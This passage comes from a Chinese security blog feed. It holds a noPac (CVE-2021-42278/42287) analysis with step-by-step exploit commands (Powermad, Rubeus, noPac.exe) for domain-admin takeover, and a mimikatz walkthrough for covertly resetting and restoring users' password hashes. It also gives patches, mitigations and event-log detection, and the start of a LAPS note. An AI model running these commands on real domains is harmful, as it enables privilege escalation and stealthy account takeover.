<td>受约束的委派信息。PAC结构必须包含一个此类型的缓冲区，以便为S4U2proxy请求提供服务，否则不包含任何缓冲区。必须忽略其他受约束的委派信息缓冲区。</td>
</tr>
<tr>
<td>0x0000000C</td>
<td>用户主体名称（UPN）和域名系统（DNS）信息。PAC结构不应包含多个此类型的缓冲区。第二个或后续UPN和DNS信息缓冲区在收到时必须忽略。</td>
</tr>
<tr>
<td>0x0000000D</td>
<td>客户索赔信息。PAC结构不应包含多个此类型的缓冲区。必须忽略其他客户端索赔信息缓冲区。</td>
</tr>
<tr>
<td>0x0000000E</td>
<td>设备信息。PAC结构不应包含多个此类型的缓冲区。必须忽略其他设备信息缓冲区。</td>
</tr>
<tr>
<td>0x0000000F</td>
<td>设备索赔信息。PAC结构不应包含多个此类型的缓冲区。必须忽略其他设备声明信息缓冲区。</td>
</tr>
<tr>
<td>0x00000010</td>
<td>票证校验和PAC结构不应包含多个此类型的缓冲区。必须忽略其他票证校验和缓冲区。</td>
</tr>
</tbody>
</table>
<p>0x00000006 对应的是Server检验和，0x00000007 对应的是KDC校验和。前面说过<code>PAC包含server和KDC签名，就是为了防止PAC内容被篡改。</code></p>
<p><strong>KERB_VALIDATION_INFO</strong></p>
<p>KERB_VALIDATION_INFO结构定义了DC提供的用户登录和授权信息，并由RPC编组。结构定义如下：</p>
<pre tabindex="0"><code>typedef struct _KERB_VALIDATION_INFO {
FILETIME LogonTime;
FILETIME LogoffTime;
FILETIME KickOffTime;
FILETIME PasswordLastSet; 
FILETIME PasswordCanChange; 
FILETIME PasswordMustChange; 
RPC_UNICODE_STRING EffectiveName; 
RPC_UNICODE_STRING FullName; 
RPC_UNICODE_STRING LogonScript; 
RPC_UNICODE_STRING ProfilePath; 
RPC_UNICODE_STRING HomeDirectory;
RPC_UNICODE_STRING HomeDirectoryDrive; USHORT LogonCount;
USHORT BadPasswordCount;
ULONG UserId;
ULONG PrimaryGroupId;
ULONG GroupCount;
[size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds; ULONG UserFlags;
USER_SESSION_KEY UserSessionKey;
RPC_UNICODE_STRING LogonServer;
RPC_UNICODE_STRING LogonDomainName;
PISID LogonDomainId;
ULONG Reserved1[2];
ULONG UserAccountControl;
ULONG SubAuthStatus;
FILETIME LastSuccessfulILogon;
FILETIME LastFailedILogon;
ULONG FailedILogonCount;
ULONG Reserved3;
ULONG SidCount;
[size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;
PISID ResourceGroupDomainSid;
ULONG ResourceGroupCount;
[size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;
} KERB_VALIDATION_INFO;
</code></pre><p>主要看UserId、GroupCount和GroupId字段：</p>
<p>Userid：域SID+用户RID（用户SID）</p>
<p>GroupCount：包含帐户所属帐户域内的组数。</p>
<p>GroupID：指向GROUP_MEMBERSHIP GroupIds结构列表的指针，其中包含帐户域中帐户所属的组。此列表中的组数必须等于GroupCount。其中513为域用户，512、520、518、519 是域管组。</p>
<p><code>MS14068就是将高权限的GroupId插入到伪造的PAC中从而提升权限达到接管域的目的。</code></p>
<p>TGT包含PAC，定位到ticket→enc-part→PAC_LOGON_INFO</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/12.png" alt=""></p>
<p>Domain Computers的Group RID都为515，现在的PAC代表申请的是机器账户身份。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/13.png" alt=""></p>
<p><strong>TGS-REQ：</strong></p>
<p><code>将sAMAccountName为DC2的机器账户改为其他任意值，申请其ST</code></p>
<ol>
<li>客户端信息</li>
<li>Authenticator(Login Session Key加密时间戳)</li>
<li>TGT认购权限</li>
<li>访问的服务名</li>
</ol>
<p>TGSREQ携带ap-req，利用as-rep获取到的TGT票据并用上S4U2Self拓展，以administrator的身份请求DC2 cifs服务的ST票据。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/14.png" alt=""></p>
<p>上图中的ticket和as-rep返回的ticket都是TGT票据，client用此进行TGS相关后续认证。</p>
<hr>
<p><strong>S4U2Self</strong></p>
<p>S4U包括和S4U2self和S4U2proxy。S4U2proxy允许服务代表用户获得不同服务的服务票证的扩展，通常用于服务进行委派，这里不再叙述，有兴趣可以看关于委派相关的章节。</p>
<p>这个漏洞出在S4U2Self上，先来了解一下认证流程。</p>
<p><code>服务可以使用S4U2self将票证检索到自身，允许服务代表用户向自身获取Kerberos服务票据，包含用户的组，因此可用来授权，且S4U2self扩展可用于获取PAC，以确定用户是否对服务具有访问权限。</code></p>
<p>下图描述了从服务处理TGS的S4U2self TGS-REQ消息。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/15.png" alt=""></p>
<p>1.服务使用S4U2self扩展来代表用户向自身检索服务票证。该服务填写PA-FOR-USER数据结构，并向TGS发送TGS-REQ。</p>
<p>2.如果TGS支持PA-FOR-USER扩展，TGS在TGS-REP中返回用户的ST票据。ST返回的PAC包含授权数据。</p>
<p><strong>PA-FOR-USER结构：</strong></p>
<pre tabindex="0"><code>PA-FOR-USER ::= SEQUENCE {
       -- PA TYPE 129
       userName              [0] PrincipalName,
       userRealm              [1] Realm,            
       cksum                 [2] Checksum,             
       auth-package          [3] KerberosString
    }
</code></pre><p>PA-FOR-USER由四个字段组成：userName、userRealm、cksum和auth-package。</p>
<pre tabindex="0"><code>userName为用户的名称，默认名称类型为NT-UNKNOWN。

userRealm是用户帐户的当前域。

auth-package字段必须设置为字符串“Kerberos”，并且不区分大小写。

cksum为前三者的校验和。使用KERB_CHECKSUM_HMAC_MD5函数计算。
</code></pre><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/16.png" alt=""></p>
<p>在微软官方文档中提到：</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/17.png" alt=""></p>
<p><code>如果KDC支持PAC，KDC必须将S4U填充的字段从TGT中的PAC复制到新创建的PAC，并在处理其支持的所有字段后， KDC必须生成新的服务器签名和KDC签名，以替换PAC中的现有签名字段。</code></p>
<p>即在S4U阶段创建了新的PAC，而新生成的PAC为后面的漏洞利用提供了充分条件。</p>
<p><strong>TGS-REP：</strong></p>
<ol>
<li>检查自身是否存在服务，如果存在，通过krbtgt解密TGT并通过Login Session Key解密Authenticator(Login Session Key加密时间戳)，就验证了对方身份。然后验证时间戳是否在范围内，并且验证TGT中的时间戳是否过期，原始地址是否和TGT保存的地址相同等。</li>
<li>生成用AS-REP得到的Login Session Key加密后的用于确保安全传输的<strong>Server Session Key</strong>。</li>
<li>完成认证后，TGS生成ST票据，其中包括：客户端信息和原始的Server Session Key，<code>整个ST票据由该服务的NTLM Hash加密。</code></li>
<li>将<strong>ST和Server Session Key</strong>发送给客户端。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/18.png" alt=""></p>
<p>结果可以看到在S4U2Self拓展在TGS-REQ中生成了新的高权限PAC用于访问申请的服务。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/19.png" alt=""></p>
<p>在申请ST票据时，kerberos找不到DC2这个用户，由于是机器账户会触发fallback自动添加$变为DC2$。 结果在 ST 中使用域控的密钥进行加密，进而可以模拟域控上任意服务的任意用户进行访问登陆。</p>
<p>由此可见S4U2Self阶段是漏洞触发的关键点，如果没有S4U2Self就不会生成新的高权限PAC，流程没有任何问题，只是在这之后没有做好鉴权：<code>PAC没有原始请求者的信息、KDC没有识别高权限ST作用于哪个机器账户</code>，从而产生了漏洞。</p>
<h2 id="0x04-漏洞利用">0x04 漏洞利用</h2>
<h3 id="整体流程">整体流程</h3>
<p><strong>假设域内DC机器名为DC1$</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.利用域用户创建域机器Evil。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2.清除Evil的SPN属性。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3.将域机器Evil的sAMAccountName属性更改为DC1(不带$)。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">4.为Evil请求TGT，随后将其sAMAccountName更改为其他名字(除DC1均可)。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">5.通过S4U2self向KDC请求DC1的ST票据(可以任意指定service类型)；KDC找不到DC1这个机器账号,在DC1后面自动添加$匹配为DC1$(域控),从而返回域控机器账户代替DC1 的ST票证。
</span></span></code></pre></div><h3 id="利用步骤">利用步骤</h3>
<p><strong>1.利用域用户创建域机器Evilsystem</strong></p>
<p>域内任意域用户默认可以添加10台域机器，这是用于加域的正常功能，在LDAP中呈现的字段为ms-DS-MachineAccountQuota的值。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/20.png" alt=""></p>
<p>(1)powermad：</p>
<p>默认<code>会</code>自动为其创建机器注册SPN</p>
<p>以任意普通域用户创建一个名为Evilsystem，密码为1qaz@WSX的域机器</p>
<p><code>New-MachineAccount -MachineAccount Evilsystem -Password $(ConvertTo-SecureString &quot;1qaz@WSX&quot; -AsPlainText -Force)</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/21.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/22.png" alt=""></p>
<p>(2)addcomputer.py</p>
<p>默认<code>不会</code>自动为其创建机器注册SPN</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/23.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/24.png" alt=""></p>
<p><strong>2.清除Evilsystem的servicePrincipalName属性(addcomputer.py添加机器用户省略这一步骤)</strong></p>
<p><code>Set-DomainObject &quot;CN=Evilsystem,CN=Computers,DC=redteam,DC=lab&quot; -Clear 'serviceprincipalname' -Verbose</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/25.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/26.png" alt=""></p>
<p><strong>3.将域机器Evilsystem的sAMAccountName属性更改为DC1(不带$)</strong></p>
<p><code>Set-MachineAccountAttribute -MachineAccount &quot;Evilsystem&quot; -Value &quot;DC1&quot; -Attribute samaccountname -Verbose</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/27.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/28.png" alt=""></p>
<p><strong>4.为Evilsystem请求TGT，随后将sAMAccountName更改为其他名字(除DC1均可)</strong></p>
<p><code>Rubeus.exe asktgt /user:&quot;DC1&quot; /password:&quot;1qaz@WSX&quot; /domain:&quot;redteam.lab&quot; /dc:&quot;DC1.redteam.lab&quot; /nowrap</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/30.png" alt=""></p>
<p><code>Set-MachineAccountAttribute -MachineAccount &quot;Evilsystem&quot; -Value &quot;EvilEvil&quot; -Attribute samaccountname -Verbose</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/29.png" alt=""></p>
<p><strong>5.通过S4U2self向KDC请求DC1的ST票据(可以任意指定service类型)</strong></p>
<p>在这里模拟了administrator用户访问DC1上cifs服务的ST票据，<a href="https://adsecurity.org/?page_id=183">这可以是域中任何系统上任何服务上的任何用户</a>。</p>
<p>（也可以申请host服务票据直接添加用户，或者直接申请ldap的票据进行dcsync。）</p>
<p><code>Rubeus.exe s4u /self /impersonateuser:&quot;administrator&quot; /altservice:&quot;cifs/DC1.redteam.lab&quot; /dc:&quot;DC1.redteam.lab&quot; /ptt /ticket:doIEujCCBLag..</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/42.png" alt=""></p>
<p>验证结果</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/31.png" alt=""></p>
<p><strong>公开EXP利用：</strong></p>
<p><a href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
<p><code>noPac.exe -domain redteam.lab -user carn1 -pass Qq123456.. /dc dc1.redteam.lab /mAccount Evils /mPassword 1qaz@WSX /service cifs /ptt</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/32.png" alt=""></p>
<h3 id="其他利用场景">其他利用场景</h3>
<p><code>漏洞利用的最终条件就是在域控没打补丁的情况下，能够任意修改域机器的SPN和sAMAccountName属性进行滥用。</code></p>
<p><strong>1.林信任利用</strong></p>
<p><a href="https://exploit.ph/more-samaccountname-impersonation.html">Charlie Clark在后面的文章中展示了林信任的利用方式</a></p>
<p>A域和B域互相信任，如果有A域a用户的权限，可以利用信任关系在B域创建计算机账户达到漏洞利用。</p>
<p><strong>2.MAQ=0利用</strong></p>
<p><code>前面的利用基于MAQ(MachineAccountQuota)创建域机器来实现，如果限制MAQ，有以下思路：</code></p>
<p>(<strong>1).CreatorSID</strong></p>
<p>按照微软的ACL规定，创建者即为所有者，所有者必定拥有完全控制权限，当然包括更改名称等一系列属性。</p>
<p>利用MAQ创建域机器利用的方式其实就是利用了CreatorSID属性，在一些域内有专门拉机器账户进域的用户，比如carn1用户将demo123机器拉入域内，则demo123的CreatorSID指向carn1。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/33.png" alt=""></p>
<p>通过SID查询Creator</p>
<p><code>AdFind.exe -f &quot;(&amp;(objectsid=S-1-5-21-2588586899-1821113704-3426516109-2603))&quot; objectclass cn dn</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/34.png" alt=""></p>
<p>查询carn1对demo123的ACL权限</p>
<p><code>AdFind.exe -b &quot;CN=demo123,CN=Computers,DC=redteam,DC=lab&quot; nTSecurityDescriptor -sddlfilter ;;;;;&quot;carn1&quot; -sddl+++ -recmute</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/35.png" alt=""></p>
<p>在拿到一个域用户权限后，可以遍历LDAP查找具有CreatorSID属性的域机器和对应的域用户，如果我们已经有了对应的域用户权限，就可以利用这个用户修改对应域机器的属性来进行漏洞利用。</p>
<p>查找每个域机器的加域账号<!-- raw HTML omitted --><code>AdFind.exe -b “DC=redteam,DC=lab” -f “(&amp;(samAccountType=805306369))” cn mS-DS-CreatorSID</code></p>
<p>通过用户的sid查看哪些域机器是通过自己加入到域内的：
<code>AdFind.exe -b &quot;DC=redteam,DC=lab&quot; -f &quot;(&amp;(samAccountType=805306369)(mS-DS-CreatorSID=UserSid))&quot; cn sAMAccountType objectCategory</code></p>
<p>(<strong>2).ACL权限</strong></p>
<p>域内拿到A用户权限后，遍历ACL发现其对域机器B有 GenericAll / GenericWrite等权限，可以通过A直接修改B的属性利用。遍历ACL分析通常用在穷途末路的时候，更适合做一个后门使用，具体使用依情况而定。</p>
<h2 id="0x05-漏洞修复">0x05 漏洞修复</h2>
<p>1.打<a href="https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e">KB5008102</a>， <a href="https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041">KB5008380</a>补丁。</p>
<p>2.MAQ(MachineAccountQuota)属性值设为0。</p>
<p>3.遍历域内并清除相关可能被利用的ACL。</p>
<p>4.创建名为<code>PacRequestorEnforcement</code>type<code>REG_DWORD</code>的注册表<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Kdc</code>，并为其值设为<code>2</code>，这样的话旧的TGT就不再起作用，让入侵者以前生成的凭据无效。</p>
<h2 id="0x06-日志分析">0x06 日志分析</h2>
<p>1.创建机器账号产生4741事件</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/36.png" alt=""></p>
<p>2.删除SPN产生4742事件</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/37.png" alt=""></p>
<p>3.将sAMAccountName改为DC1产生4781事件</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/38.png" alt=""></p>
<p>4.申请TGT并改名产生4768、4781事件</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/39.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/40.png" alt=""></p>
<p>5.通过S4U获取ST产生4769事件</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/41.png" alt=""></p>
<p>在上述日志中，TGT和ST的申请在域内太过频繁、如果是通过impacket中的addcomputer.py添加的机器账号默认不会包含SPN、所以可随时监控4741(创建机器账号产生)、4781(更改sAMAccountName名称)来确保域内没有被滥用此漏洞，当然最重要的还是对漏洞进行修复。</p>
<h2 id="0x07-参考">0x07 参考</h2>
<p><a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html</a></p>
<p><a href="https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing">https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing</a></p>
<p><a href="https://www.netspi.com/blog/technical/network-penetration-testing/machineaccountquota-is-useful-sometimes/">https://www.netspi.com/blog/technical/network-penetration-testing/machineaccountquota-is-useful-sometimes/</a></p>
<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962</a></p>
<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84</a></p>
<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a?redirectedfrom=MSDN</a></p>
]]></content>
        </item>
        
        <item>
            <title>利用MS-SAMR协议修改用户密码</title>
            <link>https://lzzbb.github.io/posts/2021/11/%E5%88%A9%E7%94%A8ms-samr%E5%8D%8F%E8%AE%AE%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/</link>
            <pubDate>Sat, 27 Nov 2021 00:00:00 +0000</pubDate>
            
            <guid>https://lzzbb.github.io/posts/2021/11/%E5%88%A9%E7%94%A8ms-samr%E5%8D%8F%E8%AE%AE%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/</guid>
            <description>利用场景 1.拿下域控后定位到定位用户或者靶标，需要密码进行登录。 2.拿到某用户hash后，同样想通过该用户账户登录某系统，但目标系统不支持pth或者当前用户权限不支持pth。 虽然拿到了修改/重置密码的权限，但又不想直接修改目标用户的密码，因为这样用户在登录时就会发现自己的密码被修改了，此时有两种情况：
1.如果有重置密码权限就可以使用SetNTLM来将用户密码重置 2.如果有hash的话可以使用ChangeNTLM修改 登录目标系统后，再将目标密码还原,默认情况下creatorsid用户有以上权限。
SetNTLM 将域用户的密码或hash重置为新的密码或hash
利用条件 当前身份对要修改的用户有Reset Password权限（默认域管具有此权限）
假设此时拿到域控，想修改域内用户marry的密码来登录某系统，先Dcsync看用户当前的hash
lsadump::dcsync /domain:redteam.lab /user:marry1 /csv
重置用户密码为123456 lsadump::SETNTLM /server:192.168.129.130 /user:marry1 /password:1qaz@WSX
登陆后再恢复密码 lsadump::SETNTLM /server:192.168.129.130 /user:marry1 /ntlm:5e95607216d9a4b7654d831beb9ee95c
ChangeNTLM 依靠用户hash修改其密码
利用条件 需要对目标用户有Change Password权限
该权限一般是veryone拥有的，所以基本上拿到目标用户的hash/密码后都可以进行密码更改
ChangeNTLM受到组策略影响，如果域内密码策略进行了限制，比如设置了密码最短使用期限为1天，这样每天只能修改一次密码。并且如果测试设置了强制密码历史规则时，则在更改次数内不能将密码修改为原密码。
先关闭域内密码策略
查询指定用户marry的NTLM Hash
lsadump::dcsync /domain:redteam.lab /user:marry1 /csv
重置用户密码为1qaz@WSX lsadump::changentlm /server:192.168.129.130 /user:marry2 /old:5e95607216d9a4b7654d831beb9ee95c /newpassword:1qaz@WSX
登陆后再恢复密码hash lsadump::changentlm /server:192.168.129.130 /user:marry2 /oldpassword:1qaz@WSX /new:5e95607216d9a4b7654d831beb9ee95c
如果恢复开始限制的组策略 lsadump::dcsync /domain:redteam.lab /user:jack /csv lsadump::changentlm /server:192.168.129.130 /user:jack /old:100171788f70402eb8cfddf3ea1189d0 /newpassword:123qwe. lsadump::changentlm /server:192.168.129.130 /user:jack /oldpassword:123qwe. /new:100171788f70402eb8cfddf3ea1189d0 会显示 ERROR kuhl_m_lsadump_changentlm_callback ; Bad new NTLM hash or password!</description>
            <content type="html"><![CDATA[<h2 id="利用场景">利用场景</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.拿下域控后定位到定位用户或者靶标，需要密码进行登录。
</span></span><span class="line"><span class="cl">2.拿到某用户hash后，同样想通过该用户账户登录某系统，但目标系统不支持pth或者当前用户权限不支持pth。
</span></span></code></pre></div><p>虽然拿到了修改/重置密码的权限，但又不想直接修改目标用户的密码，因为这样用户在登录时就会发现自己的密码被修改了，此时有两种情况：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.如果有重置密码权限就可以使用SetNTLM来将用户密码重置
</span></span><span class="line"><span class="cl">2.如果有hash的话可以使用ChangeNTLM修改
</span></span></code></pre></div><p>登录目标系统后，再将目标密码还原,<code>默认情况下creatorsid用户有以上权限</code>。</p>
<h2 id="setntlm">SetNTLM</h2>
<p>将域用户的密码或hash重置为新的密码或hash</p>
<h3 id="利用条件">利用条件</h3>
<p>当前身份对要修改的用户有Reset Password权限（默认域管具有此权限）</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MS-SAMR/1.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MS-SAMR/2.png" alt=""></p>
<p>假设此时拿到域控，想修改域内用户marry的密码来登录某系统，先Dcsync看用户当前的hash</p>
<p><code>lsadump::dcsync /domain:redteam.lab /user:marry1 /csv</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MS-SAMR/3.png" alt=""></p>
<h3 id="重置用户密码为123456">重置用户密码为123456</h3>
<p><code>lsadump::SETNTLM /server:192.168.129.130 /user:marry1 /password:1qaz@WSX</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MS-SAMR/4.png" alt=""></p>
<h3 id="登陆后再恢复密码">登陆后再恢复密码</h3>
<p><code>lsadump::SETNTLM /server:192.168.129.130 /user:marry1 /ntlm:5e95607216d9a4b7654d831beb9ee95c</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MS-SAMR/5.png" alt=""></p>
<h2 id="changentlm">ChangeNTLM</h2>
<p>依靠用户hash修改其密码</p>
<h3 id="利用条件-1">利用条件</h3>
<p>需要对目标用户有Change Password权限</p>
<p>该权限一般是veryone拥有的，所以基本上拿到目标用户的hash/密码后都可以进行密码更改</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MS-SAMR/6.jpg" alt=""></p>
<p>ChangeNTLM受到组策略影响，如果域内密码策略进行了限制，比如设置了密码最短使用期限为1天，这样每天只能修改一次密码。并且如果测试设置了强制密码历史规则时，则在更改次数内不能将密码修改为原密码。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MS-SAMR/7.jpg" alt=""></p>
<p>先关闭域内密码策略</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MS-SAMR/8.jpg" alt=""></p>
<p>查询指定用户marry的NTLM Hash</p>
<p><code>lsadump::dcsync /domain:redteam.lab /user:marry1 /csv</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MS-SAMR/9.png" alt=""></p>
<h3 id="重置用户密码为1qazwsx">重置用户密码为1qaz@WSX</h3>
<p><code>lsadump::changentlm /server:192.168.129.130 /user:marry2 /old:5e95607216d9a4b7654d831beb9ee95c /newpassword:1qaz@WSX</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MS-SAMR/10.png" alt=""></p>
<h3 id="登陆后再恢复密码hash">登陆后再恢复密码hash</h3>
<p><code>lsadump::changentlm /server:192.168.129.130 /user:marry2 /oldpassword:1qaz@WSX /new:5e95607216d9a4b7654d831beb9ee95c</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MS-SAMR/11.jpg" alt=""></p>
<h3 id="如果恢复开始限制的组策略">如果恢复开始限制的组策略</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">lsadump::dcsync /domain:redteam.lab /user:jack /csv
</span></span><span class="line"><span class="cl">lsadump::changentlm /server:192.168.129.130 /user:jack /old:100171788f70402eb8cfddf3ea1189d0 /newpassword:123qwe.
</span></span><span class="line"><span class="cl">lsadump::changentlm /server:192.168.129.130 /user:jack /oldpassword:123qwe. /new:100171788f70402eb8cfddf3ea1189d0
</span></span></code></pre></div><p>会显示 ERROR kuhl_m_lsadump_changentlm_callback ; Bad new NTLM hash or password! (restriction)</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MS-SAMR/12.jpg" alt=""></p>
<h2 id="检测与缓解">检测与缓解</h2>
<h3 id="changentlm-1">ChangeNTLM</h3>
<p>ChangeNTLM会产生4723、4738两条日志，并且日志中的使用者和目标账户并不是同一个账户</p>
<h3 id="setntlm-1">SetNTLM</h3>
<p>SetNTLM会产生4724、4738日志</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MS-SAMR/13.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/MS-SAMR/14.png" alt=""></p>
]]></content>
        </item>
        
        <item>
            <title>laps</title>
            <link>https://lzzbb.github.io/posts/2021/11/laps/</link>
            <pubDate>Fri, 12 Nov 2021 00:00:00 +0000</pubDate>
            
            <guid>https://lzzbb.github.io/posts/2021/11/laps/</guid>
            <description>防止PTH攻击 域机器的本地管理员很少被使用，但是给网路安全却带来了很大的风险。攻击者如果获取了本地管理员的NTLM，不需要破解，就可以尝试通过PTH攻击域内其他主机。为了解决这个问题，微软在2014年发布了KB2871997和KB2928120两个补丁，普通本地管理员(SID不等于500)PTH方式失效。
本地管理员密码解决方案 (LAPS) 为在域中的每台计算机上使用具有相同密码的公共本地帐户的问题提供了解决方案。LAPS 通过为域中每台计算机上的公共本地管理员帐户设置不同的随机密码来解决此问题。使用该解决方案的域管理员可以确定哪些用户有权读取密码。
LAPS要点 通过组策略开启部署LAPS后可以导出保存laps组策略报告浏览相关信息
在LDAP中也体现了ms-mcs-AdmPwdExpirationTime和ms-mcs-AdmPwd字段
其中ms-mcs-AdmPwdExpirationTime只要是经过了域身份验证都可以进行枚举；ms-mcs-AdmPwd只能由域管理员查看。
防御措施 1. 尽管LAPS有效防御了PTH攻击，但由于ms-mcs-AdmPwd字段在LDAP中是以明文存储的，在攻击者拿到整个域权限后可以枚举所有的密码，所以LAP也需要在一个短的周期内更改密码。 2. 对域内进行加固。 AD CHECK 可以检查 CN=ms-Mcs-AdmPwd,CN=Schema,CN=Configuration,DC=redteam,DC=local是否存在CN=ms-Mcs-AdmPwd字段来判断是否部署LAPS。</description>
            <content type="html"><![CDATA[<h3 id="防止pth攻击">防止PTH攻击</h3>
<p>域机器的本地管理员很少被使用，但是给网路安全却带来了很大的风险。攻击者如果获取了本地管理员的NTLM，不需要破解，就可以尝试通过PTH攻击域内其他主机。为了解决这个问题，微软在2014年发布了KB2871997和KB2928120两个补丁，普通本地管理员(SID不等于500)PTH方式失效。</p>
<p>本地管理员密码解决方案 (LAPS) 为在域中的每台计算机上使用具有相同密码的公共本地帐户的问题提供了解决方案。LAPS 通过为域中每台计算机上的公共本地管理员帐户设置不同的随机密码来解决此问题。使用该解决方案的域管理员可以确定哪些用户有权读取密码。</p>
<h3 id="laps要点">LAPS要点</h3>
<p>通过组策略开启部署LAPS后可以导出保存laps组策略报告浏览相关信息</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/laps/1.png" alt=""></p>
<p>在LDAP中也体现了ms-mcs-AdmPwdExpirationTime和ms-mcs-AdmPwd字段</p>
<p>其中ms-mcs-AdmPwdExpirationTime只要是经过了域身份验证都可以进行枚举；ms-mcs-AdmPwd只能由域管理员查看。</p>
